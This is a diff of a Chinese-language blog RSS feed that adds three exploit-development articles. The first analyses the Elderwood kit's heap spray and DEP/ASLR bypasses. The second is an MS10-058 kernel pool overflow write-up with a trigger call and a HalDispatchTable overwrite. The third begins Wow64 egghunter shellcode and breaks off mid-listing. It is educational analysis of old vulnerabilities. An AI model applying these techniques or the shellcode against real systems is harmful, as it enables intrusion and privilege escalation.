@@ -7,7 +7,334 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Mon, 04 Aug 2025 19:06:14 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 05 Aug 2025 16:00:21 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>使用Elderwood工具包编写漏洞利用程序（第一部分） - 堆喷射与DEP/ASLR绕过技术详解</title>
+        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8elderwood%E5%B7%A5%E5%85%B7%E5%8C%85%E7%BC%96%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E5%A0%86%E5%96%B7%E5%B0%84%E4%B8%8Edep/aslr%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</link>
+        <pubDate>Tue, 05 Aug 2025 16:00:21 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8elderwood%E5%B7%A5%E5%85%B7%E5%8C%85%E7%BC%96%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E5%A0%86%E5%96%B7%E5%B0%84%E4%B8%8Edep/aslr%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</guid>
+        <description>&lt;h1 id=&#34;堆喷射与dep绕过todayswf&#34;&gt;堆喷射与DEP绕过（today.swf）
+&lt;/h1&gt;&lt;p&gt;数据执行保护（DEP）阻止内存被隐式执行。漏洞利用通常会在内存中创建数据形式的载荷并尝试执行。启用DEP后，攻击者必须明确标记其载荷为可执行状态。为绕过该防护，漏洞可利用内存中已标记为可执行的代码。许多攻击通过链式调用函数来标记载荷可执行，这种技术常被称为面向返回编程（ROP）。Windows XP及更高版本上的IE8采用DEP防护，必须绕过该机制才能成功执行代码。&lt;/p&gt;
+&lt;p&gt;today.swf为用户执行DEP绕过。该Flash文档在内存中建立多个ROP链，确保其中一个位于已知地址（堆喷射）。当IE被攻击时，ROP链会将堆栈转移到伪造堆栈而非合法堆栈。堆栈转移后，ROP链执行指令序列，生成可执行的解密代码副本（将xsainfo.jpg转为DLL并执行）。由于Flash插件与浏览器渲染进程共享内存空间（与Chrome/Safari/Firefox不同），此操作可在插件内完成。&lt;/p&gt;
+&lt;p&gt;SWF在JavaScript漏洞代码加载前被引入。加载swf时，堆喷射代码自动运行。用户无需了解其技术细节，最终结果是堆中充满堆栈帧，工具包用户可假定特定地址0x10ab0d0c处存在有效值。这意味着用户只需知道跳转目标地址：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;location&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;unescape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;%u0d0c%u10abhttps://www.google.com/settings/account&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;分析过程中发现，用于混淆Flash组件的软件可在Google搜索&amp;quot;SWF Encryption&amp;quot;首页找到。DoSWF是首个无需邮箱即可下载安装包的结果，且由北京某中国公司开发。&lt;/p&gt;
+&lt;h1 id=&#34;aslr绕过microsoft-office与java-6&#34;&gt;ASLR绕过（Microsoft Office与Java 6）
+&lt;/h1&gt;&lt;p&gt;地址空间布局随机化（ASLR）是Windows Vista及更新系统的防护机制，会随机化内存中代码位置。ASLR通过使ROP指令位置未知来干扰攻击者对程序流的控制。最简单的绕过方法是定位未编译Dynamic Base标志的模块（表示不支持ASLR）。此类模块以固定虚拟地址加载后，攻击者可复用其中的已知指令序列，如同ASLR不存在。&lt;/p&gt;
+&lt;p&gt;该工具包提供代码来加载多个未编译Dynamic Base标志的模块，包括Microsoft Office 2007/2010和未支持ASLR的Java 6插件。这些模块中的内存地址用于构建Flash文档中的ROP链。利用此特性绕过ASLR非常简单，工具包可能提供脚本来调用必要的插件加载例程。作者直接使用现成研究技术开发脚本：采用Oracle示例代码加载Java 6实现ASLR绕过（Google搜索&amp;quot;force java 6&amp;quot;可发现此代码）。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;deployJava.js&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;try {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    location.href = &amp;#39;ms-help://&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;} catch (e) {}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;try {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    var ma = new ActiveXObject(&amp;#34;SharePoint.OpenDocuments.4&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;} catch(e) {}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;加载这些插件后，config.html根据成功情况设置值，将&amp;quot;test&amp;quot; div标签的innerHTML设为true/false/default/cat。today.swf读取该值决定加载哪个内置ROP链，表明两者可能同步开发并提供给工具包用户。&lt;/p&gt;
+&lt;h1 id=&#34;结论&#34;&gt;结论
+&lt;/h1&gt;&lt;p&gt;Elderwood工具包提供可复用组件来开发use-after-free漏洞利用程序，包含通过Adobe Flash实现堆喷射、加载未支持ASLR模块的技术，以及多个Windows版本的DEP绕过ROP链。工具用户几乎不需要理解这些技术的实现原理。例如用户无需了解内存布局和堆分配，直接使用工具包提供的固定地址即可。&lt;/p&gt;
+&lt;p&gt;虽然这些工具满足多数漏洞开发需求，但某些任务仍需针对具体漏洞实现。例如要使用SWF置于内存的ROP指令，工具用户必须控制程序流——这正是各漏洞利用的特殊之处。我们将在下一章节讨论工具用户解决该问题的具体方案。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>内核池初探：MS10-058漏洞分析与利用</title>
+        <link>http://localhost:1313/p/%E5%86%85%E6%A0%B8%E6%B1%A0%E5%88%9D%E6%8E%A2ms10-058%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</link>
+        <pubDate>Tue, 05 Aug 2025 14:48:58 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E5%86%85%E6%A0%B8%E6%B1%A0%E5%88%9D%E6%8E%A2ms10-058%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</guid>
+        <description>&lt;h1 id=&#34;内核池初探ms10-058漏洞分析与利用&#34;&gt;内核池初探：MS10-058漏洞分析与利用
+&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
+&lt;/h2&gt;&lt;p&gt;我正在研究基于池(pool)的内存破坏漏洞。因此我想为Tarjei Mandt在其首次演讲&amp;quot;Windows 7内核池利用&amp;quot;[3]中提到的漏洞编写一个PoC利用程序。我认为这是开始学习池溢出漏洞的好练习。&lt;/p&gt;
+&lt;h2 id=&#34;目录&#34;&gt;目录
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;引言&lt;/li&gt;
+&lt;li&gt;前言&lt;/li&gt;
+&lt;li&gt;触发漏洞&lt;/li&gt;
+&lt;li&gt;池喷射技术
+&lt;ul&gt;
+&lt;li&gt;非分页对象&lt;/li&gt;
+&lt;li&gt;nt!PoolHitTag&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;利用技术
+&lt;ul&gt;
+&lt;li&gt;基本结构&lt;/li&gt;
+&lt;li&gt;覆盖PoolIndex&lt;/li&gt;
+&lt;li&gt;非分页池类型&lt;/li&gt;
+&lt;li&gt;伪造池描述符&lt;/li&gt;
+&lt;li&gt;注意事项&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;载荷与清理&lt;/li&gt;
+&lt;li&gt;致谢&lt;/li&gt;
+&lt;li&gt;结论&lt;/li&gt;
+&lt;li&gt;参考文献&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;前言&#34;&gt;前言
+&lt;/h2&gt;&lt;p&gt;如果你想实验这个漏洞，应该阅读[1]并确保拥有易受攻击的系统。我在Windows 7 32位虚拟机(tcpip.sys 6.1.7600.16385)上测试了这个漏洞。微软关于此漏洞的公告是MS10-058，由Matthieu Suiche[2]发现，并被用作Tarjei Mandt论文[3]中的示例。&lt;/p&gt;
+&lt;h2 id=&#34;触发漏洞&#34;&gt;触发漏洞
+&lt;/h2&gt;&lt;p&gt;tcpip!IppSortDestinationAddresses中的整数溢出导致分配了错误大小的非分页池内存块。漏洞版本与修补版本的差异如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+29   imul    eax, 1Ch
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+2C   push    esi
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+2D   mov     esi, ds:__imp__ExAllocatePoolWithTag@12 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+33   push    edi
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+34   mov     edi, 73617049h
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+39   push    edi   
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+3A   push    eax  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+3B   push    ebx           
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IppSortDestinationAddresses(x,x,x)+3C   call    esi ; ExAllocatePoolWithTag(x,x,x)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以通过WSAIoctl调用(SIO_ADDRESS_LIST_SORT)触发此代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;WSAIoctl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sock&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SIO_ADDRESS_LIST_SORT&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pwn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;池喷射技术&#34;&gt;池喷射技术
+&lt;/h2&gt;&lt;h3 id=&#34;非分页对象&#34;&gt;非分页对象
+&lt;/h3&gt;&lt;p&gt;我们可以使用多种对象来操作非分页池，例如信号量对象或保留对象。由于驱动请求的是0x54字节(实际获得0x60字节块)，这与I/O完成保留对象(IoCo)的大小完全匹配。&lt;/p&gt;
+&lt;h3 id=&#34;ntpoolhittag&#34;&gt;nt!PoolHitTag
+&lt;/h3&gt;&lt;p&gt;要调试特定的ExFreePoolWithTag调用，可以使用池命中标签(pool hit tags)。nt!PoolHitTag会与当前释放块的池标签进行比较，如果匹配则触发调试断点。&lt;/p&gt;
+&lt;h2 id=&#34;利用技术&#34;&gt;利用技术
+&lt;/h2&gt;&lt;h3 id=&#34;基本结构&#34;&gt;基本结构
+&lt;/h3&gt;&lt;p&gt;池内存分为多种类型，其中两种是分页池和非分页池。池由_POOL_DESCRIPTOR结构描述，包含PoolType、ListHeads等字段。每个内存块在数据前都有一个_POOL_HEADER头，包含块大小、所属池等信息。&lt;/p&gt;
+&lt;h3 id=&#34;覆盖poolindex&#34;&gt;覆盖PoolIndex
+&lt;/h3&gt;&lt;p&gt;这种攻击的基本思路是破坏池头中的PoolIndex字段。该字段用于在释放分页池块时确定它属于哪个池描述符。攻击者可以通过破坏此字段使池管理器认为特定块属于另一个池描述符。&lt;/p&gt;
+&lt;h3 id=&#34;伪造池描述符&#34;&gt;伪造池描述符
+&lt;/h3&gt;&lt;p&gt;我们需要在空地址处伪造一个池描述符。只需分配该页面并放置伪造的延迟空闲列表和ListHeads即可。当释放一个块时，如果延迟空闲列表包含至少0x20个条目，ExFreePoolWithTag将实际释放这些块并将它们放在ListHeads的适当条目上。&lt;/p&gt;
+&lt;h2 id=&#34;注意事项&#34;&gt;注意事项
+&lt;/h2&gt;&lt;p&gt;值得注意的是，这种攻击在现代缓解措施下无法工作，主要原因包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PoolIndex字段的验证&lt;/li&gt;
+&lt;li&gt;防止空页分配&lt;/li&gt;
+&lt;li&gt;Windows 8引入了NonPagedPoolNX类型&lt;/li&gt;
+&lt;li&gt;SMAP防止访问用户态数据&lt;/li&gt;
+&lt;li&gt;SMEP防止执行用户态代码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;载荷与清理&#34;&gt;载荷与清理
+&lt;/h2&gt;&lt;p&gt;经典的&amp;quot;写任意位置&amp;quot;场景目标是HalDispatchTable。我们只需用指向我们载荷(setupPayload())的指针覆盖HalDispatchTable+4。完成后，我们需要将指针恢复为hal!HaliQuerySystemInformation。&lt;/p&gt;
+&lt;h2 id=&#34;致谢&#34;&gt;致谢
+&lt;/h2&gt;&lt;p&gt;特别感谢我的朋友@0vercl0k的审查和帮助！&lt;/p&gt;
+&lt;h2 id=&#34;结论&#34;&gt;结论
+&lt;/h2&gt;&lt;p&gt;希望你喜欢这篇文章。如果你想了解更多关于这个主题的内容，可以查看Tarjei Mandt、Zhenhua Liu和Nikita Tarakanov的最新论文。你可以在我的新github[5]上找到我的代码。&lt;/p&gt;
+&lt;h2 id=&#34;参考文献&#34;&gt;参考文献
+&lt;/h2&gt;&lt;p&gt;[1] itsecdb上的漏洞详情
+[2] 微软公告
+[3] Windows 7内核池利用 - Tarjei Mandt的论文(必读)
+[4] Windows 7中的保留对象 - j00ru的优秀文章
+[5] 我的MS10-058漏洞利用代码&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Windows 10 Wow64环境下的Egghunter技术解析</title>
+        <link>http://localhost:1313/p/windows-10-wow64%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84egghunter%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
+        <pubDate>Mon, 04 Aug 2025 22:52:34 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/windows-10-wow64%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84egghunter%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;windows-10-egghunterwow64技术解析&#34;&gt;Windows 10 Egghunter（Wow64）技术解析
+&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
+&lt;/h2&gt;&lt;p&gt;作者坦言对Egghunter技术一直怀有浓厚兴趣，但强调在实际漏洞利用中应尽量避免使用，因其会降低执行效率。本文是Corelan团队沉寂三年后的首篇技术文章，重点解决Windows 7时代Lincoln开发的Wow64 Egghunter在Windows 10失效的问题。&lt;/p&gt;
+&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
+&lt;/h2&gt;&lt;p&gt;微软在每个Windows主要版本中都会变更系统调用编号，导致基于特定系统调用（如NtAccessCheckAndAuditAlarm）的Egghunter失效。系统调用编号变化可通过公开文档查询（j00ru.vexillium.org）。&lt;/p&gt;
+&lt;h2 id=&#34;wow64-egghunter实现&#34;&gt;Wow64 Egghunter实现
+&lt;/h2&gt;&lt;p&gt;经过调试分析，团队发现除了系统调用编号变化外，参数传递和栈布局也发生了改变。最终实现的Windows 10 Wow64 Egghunter代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x33&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xD2&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;XOR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x66&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x81&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xCA&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xFF&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;x0F&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;DX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;FFF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x33&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;xDB&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;              &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;XOR&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;EBX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x42&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;INC&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;\&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;x52&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#34;&lt;/span&gt;                  &lt;span class=&#34;err&#34;&gt;#&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PUSH&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDX&lt;/span&gt;
